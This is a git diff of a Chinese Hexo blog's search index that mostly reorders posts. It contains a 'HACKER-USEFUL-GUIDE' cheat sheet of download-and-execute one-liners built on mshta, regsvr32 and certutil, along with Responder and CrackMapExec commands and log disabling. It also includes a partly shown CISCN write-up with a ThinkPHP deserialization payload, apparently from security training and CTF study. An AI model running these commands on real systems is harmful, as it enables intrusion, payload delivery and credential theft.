@@ -1,6 +1,23 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>408 COMPUTER PRINCIPLES MIND MAP</title>
+    <url>/2022/06/04/408com-mindmap/</url>
+    <content><![CDATA[<h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h1><h1 id="第二章-数据表示与运算"><a href="#第二章-数据表示与运算" class="headerlink" title="第二章 数据表示与运算"></a>第二章 数据表示与运算</h1><p><img src="/img/com_mind_map/CODE.png" alt="IO.png"></p>
+<h1 id="第三章-存储系统"><a href="#第三章-存储系统" class="headerlink" title="第三章 存储系统"></a>第三章 存储系统</h1><p><img src="/img/com_mind_map/MEM.png" alt="MEM.png"></p>
+<h1 id="第四章-指令系统"><a href="#第四章-指令系统" class="headerlink" title="第四章 指令系统"></a>第四章 指令系统</h1><h1 id="第五章-CPU"><a href="#第五章-CPU" class="headerlink" title="第五章 CPU"></a>第五章 CPU</h1><p><img src="/img/com_mind_map/CPU.png" alt="IO.png"></p>
+<h1 id="第六章-总线"><a href="#第六章-总线" class="headerlink" title="第六章 总线"></a>第六章 总线</h1><p><img src="/img/com_mind_map/LINE.png" alt="IO.png"></p>
+<h1 id="第七章-I-x2F-O系统"><a href="#第七章-I-x2F-O系统" class="headerlink" title="第七章 I&#x2F;O系统"></a>第七章 I&#x2F;O系统</h1><p><img src="/img/com_mind_map/IO.png" alt="IO.png"></p>
+]]></content>
+      <categories>
+        <category>计算机综合</category>
+        <category>408计算机</category>
+      </categories>
+      <tags>
+        <tag>计算机组成原理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【WP】2022强国杯南部赛区决赛（PART）</title>
     <url>/2022/10/23/360qiangguoESouth/</url>
     <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="空白文件"><a href="#空白文件" class="headerlink" title="空白文件"></a>空白文件</h2><p>一个文档,拉进010editor</p>
@@ -66,56 +83,6 @@
       <tags>
         <tag>网络空间安全</tag>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BLANE - 基于RUST的轻量化局域网通信工具</title>
-    <url>/2023/07/12/BLANE/</url>
-    <content><![CDATA[<p>项目仓库：<a href="https://github.com/DXHM/BLANE">https://github.com/DXHM/BLANE</a></p>
-<h2 id="关于本项目"><a href="#关于本项目" class="headerlink" title="关于本项目"></a>关于本项目</h2><p>此项目立项想法是在某次CTF线下赛(🚄⛰💧☔)后产生的，全球范围内的公共卫生环境的形势严峻，此前参加过的很多CTF以线上赛为主，开放后也是和队友们都第一次参加线下CTF比赛。我的团队由于对赛制缺乏了解和提前准备，对于客场分布情况及影响沟通效率都存在问题。比赛现场禁用互联网并且时间紧迫，也会给团队间的沟通交流，资料共享，协同合作产生很多障碍，耽误很多时间。由此我产生了自己编写一个应用于局域网内实现便捷通信的程序，可以在这种类似的场景下派上用场，先立项搭建个大体框架，不定时更新并将一些功能不断完善进去。</p>
-<ul>
-<li><p>本项目为基于Rust编写的一个局域网聊天工具，用于局域网设备间的日常通讯。</p>
-</li>
-<li><p>采用非对称加密算法进行数据加密传输，可以进行文字通信（支持中&#x2F;英），并具备图片和文件传输功能。</p>
-</li>
-<li><p>该项目旨在为中小型团队成员在局域网内提供一个方便快捷，安全且轻量化的聊天体验。</p>
-</li>
-</ul>
-<p>各位师傅如果什么想法欢迎issue，求关注求star！感谢您的支持，欢迎各位大佬贡献代码，本项目仍处于早期开发阶段，佛系更新。</p>
-<p>欢迎催更，下次一定😋！</p>
-<h2 id="功能特点"><a href="#功能特点" class="headerlink" title="功能特点"></a>功能特点</h2><ul>
-<li>通过非对称加密算法实现安全通信</li>
-<li>支持中英文文字通信</li>
-<li>图片和文件传输或共享</li>
-<li>在线状态跟踪</li>
-<li>可自定义用户名</li>
-<li>etc..</li>
-</ul>
-<h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><ol>
-<li><p>克隆仓库：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/DXHM/BLANE.git</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>构建项目：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> BLANE</span><br><span class="line">cargo build</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>运行服务器：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cargo run --bin server</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>运行客户端：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cargo run --bin client</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="依赖项"><a href="#依赖项" class="headerlink" title="依赖项"></a>依赖项</h2><ul>
-<li>glib-2.0：服务器和客户端 GUI 所需的依赖项（基于 GTK 的界面）</li>
-<li>openssl：用于加密算法</li>
-</ul>
-<h2 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h2><p><a href="https://github.com/dxhm"><img alt="AShujiao" src="https://avatars.githubusercontent.com/u/69539047?v=4" width="117"></a></p>
-<h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2>]]></content>
-      <categories>
-        <category>开源项目</category>
-      </categories>
-      <tags>
-        <tag>github</tag>
-        <tag>tools</tag>
       </tags>
   </entry>
   <entry>
@@ -193,115 +160,53 @@
       </tags>
   </entry>
   <entry>
-    <title>408 COMPUTER PRINCIPLES MIND MAP</title>
-    <url>/2022/06/04/408com-mindmap/</url>
-    <content><![CDATA[<h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h1><h1 id="第二章-数据表示与运算"><a href="#第二章-数据表示与运算" class="headerlink" title="第二章 数据表示与运算"></a>第二章 数据表示与运算</h1><p><img src="/img/com_mind_map/CODE.png" alt="IO.png"></p>
-<h1 id="第三章-存储系统"><a href="#第三章-存储系统" class="headerlink" title="第三章 存储系统"></a>第三章 存储系统</h1><p><img src="/img/com_mind_map/MEM.png" alt="MEM.png"></p>
-<h1 id="第四章-指令系统"><a href="#第四章-指令系统" class="headerlink" title="第四章 指令系统"></a>第四章 指令系统</h1><h1 id="第五章-CPU"><a href="#第五章-CPU" class="headerlink" title="第五章 CPU"></a>第五章 CPU</h1><p><img src="/img/com_mind_map/CPU.png" alt="IO.png"></p>
-<h1 id="第六章-总线"><a href="#第六章-总线" class="headerlink" title="第六章 总线"></a>第六章 总线</h1><p><img src="/img/com_mind_map/LINE.png" alt="IO.png"></p>
-<h1 id="第七章-I-x2F-O系统"><a href="#第七章-I-x2F-O系统" class="headerlink" title="第七章 I&#x2F;O系统"></a>第七章 I&#x2F;O系统</h1><p><img src="/img/com_mind_map/IO.png" alt="IO.png"></p>
-]]></content>
+    <title>BLANE - 基于RUST的轻量化局域网通信工具</title>
+    <url>/2023/07/12/BLANE/</url>
+    <content><![CDATA[<p>项目仓库：<a href="https://github.com/DXHM/BLANE">https://github.com/DXHM/BLANE</a></p>
+<h2 id="关于本项目"><a href="#关于本项目" class="headerlink" title="关于本项目"></a>关于本项目</h2><p>此项目立项想法是在某次CTF线下赛(🚄⛰💧☔)后产生的，全球范围内的公共卫生环境的形势严峻，此前参加过的很多CTF以线上赛为主，开放后也是和队友们都第一次参加线下CTF比赛。我的团队由于对赛制缺乏了解和提前准备，对于客场分布情况及影响沟通效率都存在问题。比赛现场禁用互联网并且时间紧迫，也会给团队间的沟通交流，资料共享，协同合作产生很多障碍，耽误很多时间。由此我产生了自己编写一个应用于局域网内实现便捷通信的程序，可以在这种类似的场景下派上用场，先立项搭建个大体框架，不定时更新并将一些功能不断完善进去。</p>
+<ul>
+<li><p>本项目为基于Rust编写的一个局域网聊天工具，用于局域网设备间的日常通讯。</p>
+</li>
+<li><p>采用非对称加密算法进行数据加密传输，可以进行文字通信（支持中&#x2F;英），并具备图片和文件传输功能。</p>
+</li>
+<li><p>该项目旨在为中小型团队成员在局域网内提供一个方便快捷，安全且轻量化的聊天体验。</p>
+</li>
+</ul>
+<p>各位师傅如果什么想法欢迎issue，求关注求star！感谢您的支持，欢迎各位大佬贡献代码，本项目仍处于早期开发阶段，佛系更新。</p>
+<p>欢迎催更，下次一定😋！</p>
+<h2 id="功能特点"><a href="#功能特点" class="headerlink" title="功能特点"></a>功能特点</h2><ul>
+<li>通过非对称加密算法实现安全通信</li>
+<li>支持中英文文字通信</li>
+<li>图片和文件传输或共享</li>
+<li>在线状态跟踪</li>
+<li>可自定义用户名</li>
+<li>etc..</li>
+</ul>
+<h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><ol>
+<li><p>克隆仓库：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/DXHM/BLANE.git</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构建项目：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> BLANE</span><br><span class="line">cargo build</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行服务器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cargo run --bin server</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>运行客户端：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cargo run --bin client</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="依赖项"><a href="#依赖项" class="headerlink" title="依赖项"></a>依赖项</h2><ul>
+<li>glib-2.0：服务器和客户端 GUI 所需的依赖项（基于 GTK 的界面）</li>
+<li>openssl：用于加密算法</li>
+</ul>
+<h2 id="贡献者"><a href="#贡献者" class="headerlink" title="贡献者"></a>贡献者</h2><p><a href="https://github.com/dxhm"><img alt="AShujiao" src="https://avatars.githubusercontent.com/u/69539047?v=4" width="117"></a></p>
+<h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2>]]></content>
       <categories>
-        <category>计算机综合</category>
-        <category>408计算机</category>
+        <category>开源项目</category>
       </categories>
       <tags>
-        <tag>计算机组成原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HACKER-USEFUL-GUIDE</title>
-    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
-<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
-<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
-<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
-<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
-<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
-<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
-<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
-<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
-</ul>
-<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
-<li>Burp Suite</li>
-<li>OWASP ZAP（开源）</li>
-<li>Dirbuster</li>
-<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
-</ol>
-<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
-<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
-<li>分两部分：服务器，攻击静荷</li>
-<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
-<li>XSS Hunter工具验证盲XSS</li>
-</ol>
-</li>
-</ol>
-<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
-<li>Responder工具<ol>
-<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
-</ol>
-</li>
-<li>MultiRelay.py</li>
-</ol>
-<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
-<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
-<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
-</ol>
-<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
-<li>（针对win10）Mimikatz</li>
-<li>（针对浏览器）Mimikittenz</li>
-</ol>
-<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
-<li>RC脚本自动化Metasploit</li>
-<li>Empire自动化</li>
-<li>Conbalt Strike自动化</li>
-</ol>
-<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
-<li>禁用powershell日志记录</li>
-</ol>
-<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
-<li>利用windows“功能”：<ul>
-<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
-<li><code>mshta http://webserver/payload.hta</code></li>
-<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
-<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
-<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
-</ul>
-</li>
-</ol>
-<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
-<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
-<li>C:&gt;<code>..\psgetsys.psl</code></li>
-<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JAVA学习路线图</title>
-    <url>/2022/03/23/JAVA-STUDY/</url>
-    <content><![CDATA[<p><img src="/img/java_study/Java%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E5%9B%BE.png"></p>
-<blockquote>
-<p>FROM：(B站UP主) 不高兴就喝水</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>编程语言</tag>
-        <tag>java</tag>
+        <tag>github</tag>
+        <tag>tools</tag>
       </tags>
   </entry>
   <entry>
@@ -953,8 +858,87 @@
         <category>网络安全</category>
       </categories>
       <tags>
-        <tag>编程语言</tag>
         <tag>程序开发安全</tag>
+        <tag>编程语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HACKER-USEFUL-GUIDE</title>
+    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
+<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
+<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
+<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
+<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
+<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
+<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
+<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
+<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
+</ul>
+<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
+<li>Burp Suite</li>
+<li>OWASP ZAP（开源）</li>
+<li>Dirbuster</li>
+<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
+</ol>
+<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
+<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
+<li>分两部分：服务器，攻击静荷</li>
+<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
+<li>XSS Hunter工具验证盲XSS</li>
+</ol>
+</li>
+</ol>
+<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
+<li>Responder工具<ol>
+<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
+</ol>
+</li>
+<li>MultiRelay.py</li>
+</ol>
+<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
+<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
+<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
+</ol>
+<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
+<li>（针对win10）Mimikatz</li>
+<li>（针对浏览器）Mimikittenz</li>
+</ol>
+<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
+<li>RC脚本自动化Metasploit</li>
+<li>Empire自动化</li>
+<li>Conbalt Strike自动化</li>
+</ol>
+<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
+<li>禁用powershell日志记录</li>
+</ol>
+<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
+<li>利用windows“功能”：<ul>
+<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
+<li><code>mshta http://webserver/payload.hta</code></li>
+<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
+<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
+<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
+<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
+<li>C:&gt;<code>..\psgetsys.psl</code></li>
+<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1285,6 +1269,22 @@
       <tags>
         <tag>操作系统</tag>
         <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JAVA学习路线图</title>
+    <url>/2022/03/23/JAVA-STUDY/</url>
+    <content><![CDATA[<p><img src="/img/java_study/Java%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E5%9B%BE.png"></p>
+<blockquote>
+<p>FROM：(B站UP主) 不高兴就喝水</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>编程语言</tag>
+        <tag>java</tag>
       </tags>
   </entry>
   <entry>
@@ -2149,8 +2149,8 @@
         <category>网络安全</category>
       </categories>
       <tags>
-        <tag>编程语言</tag>
         <tag>程序开发安全</tag>
+        <tag>编程语言</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -2411,154 +2411,6 @@
       </tags>
   </entry>
   <entry>
-    <title>【WP】FIFTEENTH CISCN (PART)</title>
-    <url>/2022/05/29/ciscn15/</url>
-    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="4-调查问卷"><a href="#4-调查问卷" class="headerlink" title="4. 调查问卷"></a>4. 调查问卷</h2><img width="273" height="152" src="/img/ciscn15/clip_image006.png" v:shapes="图片_x0020_6">
-
-<img width="381" height="145" src="/img/ciscn15/clip_image008.png" v:shapes="图片_x0020_1">
-
-<ul>
-<li><strong>flag值：flag{Thanksforplayingourgames}</strong></li>
-</ul>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-签到电台"><a href="#1-签到电台" class="headerlink" title="1. 签到电台"></a>1. 签到电台</h2><p>此题与摩斯电码关系不大</p>
-<ol>
-<li><p>输入<code>···</code>启动后BurpSuit抓个包</p>
-</li>
-<li><p>可以直接进行url<code>?msg=xxxx</code>传递</p>
-</li>
-<li><p>前往公众号获取提示</p>
-<p> <img src="/img/ciscn15/791b051d1069024a94daeb6088ae9d85.png" alt="791b051d1069024a94daeb6088ae9d85.png"></p>
-</li>
-<li><p>按照网址提供的<strong>密码本</strong>前28位，与7个电码逐位相加mod10</p>
-<p> <img src="/img/ciscn15/11d9f4b5684c6db2c80405469cd555e7.png" alt="11d9f4b5684c6db2c80405469cd555e7.png"></p>
-</li>
-<li><p>回到repeater，得到flag</p>
-<p> <img src="/img/ciscn15/d371e53295e989db066669aa100f4d76.png" alt="d371e53295e989db066669aa100f4d76.png"></p>
-</li>
-</ol>
-<ul>
-<li><p><strong>flag：flag{2adc3f3c-0264-4bb5-bea4-fec4d788bb23}</strong></p>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="4-Ezpop"><a href="#4-Ezpop" class="headerlink" title="4. Ezpop"></a>4. Ezpop</h2></li>
-<li><p>thinkphp 框架</p>
-</li>
-</ul>
-<ol>
-<li><p>发现网址目录下有源码<code>/www.zip</code>，下载下来分析</p>
-</li>
-<li><p>根据<code>/public/index.php</code>源码和注释提示构造 payload</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = True;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;cat$&#123;IFS&#125;/flag.txt&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = True;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;jsonAssoc = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span>(<span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>()))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>运行一下php代码得到</p>
